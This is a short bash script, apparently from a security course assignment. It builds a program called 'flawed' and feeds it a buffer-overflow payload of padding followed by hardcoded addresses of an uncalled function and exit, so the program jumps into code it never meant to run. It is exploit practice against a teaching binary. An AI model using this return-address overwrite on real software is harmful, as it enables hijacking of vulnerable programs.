#!/bin/bash

# Move to the assignment directory
cd ./assignment

# Compile the project
make

# Define memory addresses (little endian encoding)
UNCALLED_ADDR='\x56\x84\x04\x08' # starting addr of uncalled (use GDB)
EXIT_ADDR='\x70\xcf\xe0\xf7'	 # found using p exit command in GDB

# Run the assignment
#./flawed $(python -c "print('A'*13 +'B'*4 +'\x56\x84\x04\x08')")
./flawed $(python -c "print('A'*13 + 'B'*4 +'$UNCALLED_ADDR' + '$EXIT_ADDR')")

